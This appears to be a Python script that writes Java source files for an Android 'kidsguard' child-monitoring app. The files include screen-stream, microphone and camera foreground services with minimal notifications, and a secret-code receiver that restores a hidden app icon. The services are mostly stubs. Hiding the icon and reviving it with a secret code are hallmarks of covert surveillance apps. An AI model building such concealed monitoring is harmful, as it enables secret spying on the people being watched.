import os
b = "app/src/main/java/com/kidsguard/child"

files = {}

files["ScreenActivity.java"] = """package com.kidsguard.child;
import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
public class ScreenActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent i = new Intent(this, ScreenStreamService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
        else startService(i);
        finish();
    }
}
"""

files["ScreenCaptureHolder.java"] = """package com.kidsguard.child;
public class ScreenCaptureHolder {
    public static volatile Object holder;
}
"""

files["RecordingService.java"] = """package com.kidsguard.child;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
public class RecordingService extends Service {
    private MediaRecorder recorder;
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("rec", "Recording", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
        Notification n = new NotificationCompat.Builder(this, "rec").build();
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(2001, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
        } else {
            startForeground(2001, n);
        }
        return START_STICKY;
    }
    @Override
    public void onDestroy() {
        if (recorder != null) {
            try { recorder.stop(); } catch (Exception e) {}
            recorder.release();
        }
        super.onDestroy();
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}
"""

files["SecretCodeReceiver.java"] = """package com.kidsguard.child;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;
public class SecretCodeReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        try {
            ComponentName cn = new ComponentName(ctx, "com.kidsguard.child.MainActivityLauncher");
            ctx.getPackageManager().setComponentEnabledSetting(cn,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP);
            Log.d("SecretCode", "App icon restored");
        } catch (Exception e) {
            Log.e("SecretCode", "Restore failed", e);
        }
    }
}
"""

files["StreamService.java"] = """package com.kidsguard.child;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;
public class StreamService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel("stream", "Stream", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
        }
        Notification n = new NotificationCompat.Builder(this, "stream").build();
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(3001, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        } else {
            startForeground(3001, n);
        }
        return START_STICKY;
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}
"""

for name, code in files.items():
    with open(f"{b}/{name}", "w") as f:
        f.write(code)
    print(f"Fixed {name}")

print("Chunk 2 done — 5 files.")
